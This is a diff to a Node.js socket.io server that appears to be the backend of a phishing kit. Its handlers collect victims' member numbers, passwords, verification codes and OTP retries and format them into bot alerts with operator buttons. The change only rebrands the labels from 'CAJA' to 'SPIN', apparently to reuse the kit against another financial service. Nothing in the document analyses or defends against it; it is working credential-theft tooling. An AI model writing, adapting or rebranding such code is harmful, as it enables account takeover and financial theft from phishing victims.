@@ -29,7 +29,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 Nuevo intento de acceso SPIN:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -49,7 +49,7 @@ io.on('connection', (socket) => {
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó el siguiente código CAJA:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 El usuario ingresó el siguiente código SPIN:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -69,7 +69,7 @@ io.on('connection', (socket) => {
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 Reintento desde pantalla de error CAJA:\n\n🧾 Nuevo código OTP: ${codigo}`;
+    const mensaje = `📨 Reintento desde pantalla de error SPIN:\n\n🧾 Nuevo código OTP: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -89,7 +89,7 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado SPIN:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
